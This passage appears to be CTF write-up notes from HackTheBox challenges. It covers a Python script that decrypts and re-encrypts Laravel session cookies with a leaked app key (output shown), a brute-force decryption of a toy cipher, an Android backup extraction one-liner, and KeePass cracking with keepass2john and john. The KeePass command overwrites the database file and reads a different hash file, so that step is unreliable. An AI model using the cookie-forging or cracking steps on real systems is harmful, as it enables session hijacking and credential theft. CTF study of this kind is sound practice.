COOKIE = "eyJpdiI6InNiaEk4Nm5McnNYT3I3OFVcLzFiSU9nPT0iLCJ2YWx1ZSI6IkJKcHZLZk5tQk1mYmswdllSQ2RpM2hxV0lTbkdJanRcLzl0SWJTRkVEMmdQaHlCUlJKUXgwbkc2aUpObGJ4QUJUTFM4eHRQV2h0RFlJdkRhTzh2VE5WSjhYbHpWVGljY2VBZEJkSklcL0hodjhXbGFtQ2pwNExXRnlvVm0xUkdcL3ZFT1FVQTBBdXN4RXV5TDl4NWUwUlNWTHM0bkNoOXBrd2FzQmtrOEdmaTFIWXJZakpiaGk2YXFwR09XVEh3N0VtRGpFYkdYVWNMRlREeHFTTUVcL2VkSStGdmZzTFVNN2JLMmZTVDN1V25aaWEzQXFWZWVsZXU3cTR6WWJndXdkaU82ZEQ2MmQ3dk9tK0RTWXUxbFwvRDR0TnlYYjRTTnJuUVwvZ0IxbFRIUHY5UXI0dWVzZXh3Yk5hdGFXdWc0YjdMU0U5Ymhud3hSZGtsekVRSGc3akt2NnpKcVh0TkNTWUV5R3JFNlVCSDRKM3o1ZCtpTWl3Z3Jsc1FBcWh1eGhqZ3BhcWFad0RUZTI2YWVIY296TE1FZjY0Q0pQVkRXUm55OVdEZ1dQbFZFVmR2UklCclhjQXpSMldxRk15UWZGTCttbzJ3akUxdFNTbkxhZHZHTkpEWWMxTUZ3PT0iLCJtYWMiOiJjOTQ2ZTRmYzQ1ZDdiYzU1MzZiZjYyMmVkMGRhZTlkNjU3ZTk0NGZmMmU3MGI4YzIwMDZiZDBlYTJiMDk4N2ExIn0%3D"


class Laravel:
    def __init__(cls, key):
        cls.key = base64.b64decode(key)

    def decrypt_value(cls, text):
        decoded_text = json.loads(base64.b64decode(
            urllib.parse.unquote_plus(text)))
        iv = base64.b64decode(decoded_text['iv'])

        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)

        decoded = base64.b64decode(decoded_text['value'])
        decrypted = crypt_object.decrypt(decoded)
        decoded_text['value'] = decrypted
        return decoded_text

    def encrypt_value(cls, decstr, encstr):
        decoded_text = json.loads(base64.b64decode(
            urllib.parse.unquote_plus(encstr)))
        iv = base64.b64decode(decoded_text['iv'])

        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)

        encoded = decstr
        encrypted = crypt_object.encrypt(encoded)
        decoded_text['value'] = base64.b64encode(encrypted)
        return decoded_text
        


lar = Laravel(KEY)
print(lar.decrypt_value(COOKIE))
```
output:
```sh
{'iv': 'sbhI86nLrsXOr78U/1bIOg==', 'value': b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"kCmDLagDaKao5DAVswVZIytrGWtDSFnTFBZrZKTw\\";s:8:\\"username\\";s:8:\\"gueste69\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:39:\\"http:\\/\\/167.172.51.241:30028\\/api\\/configs\\";}}","expires":1656156091}\r\r\r\r\r\r\r\r\r\r\r\r\r', 'mac': 'c946e4fc45d7bc5536bf622ed0dae9d657e944ff2e70b8c2006bd0ea2b0987a1'}
```

### Referensi
- https://d4rkstat1c.medium.com/hackthebox-nginxatsu-ctf-write-up-f2ca7ed98cf
- https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/
- https://github.com/laravel/laravel
- https://github.com/tamimhasan404/FFUF-Tips-And-Tricks
# Crypto
## BabyEncryption
```python
msg = "6e0a9372ec49a3f6930ed8723f9df6f6720ed8d89dc4937222ec7214d89d1e0e352ce0aa6ec82bf622227bb70e7fb7352249b7d893c493d8539dec8fb7935d490e7f9d22ec89b7a322ec8fd80e7f8921"

def decryption(ct):
    buffer = []
    with open("dump.txt", "w") as f:
        for i in range(256):
            msg = []
            for char in ct:
                a = char -18
                a = i * a % 256
                msg.append(chr(a))
            msg = "".join(msg)
            f.write(msg + "\n\n\n")

decryption(bytes.fromhex(msg))
```
# Mobile
```sh
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 cat.ab ) |  tar xfvz -
```
# Forensics
## Obscure
- deobfuscate
- check pcap
	- check malcious input
- decode from base64
- download keepass2
```sh
keepass2john pass.kdbx > pass.kdbx
john pass.hash /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt
```
### Referensi
- https://joshuanatan.medium.com/hack-bfc7c6528463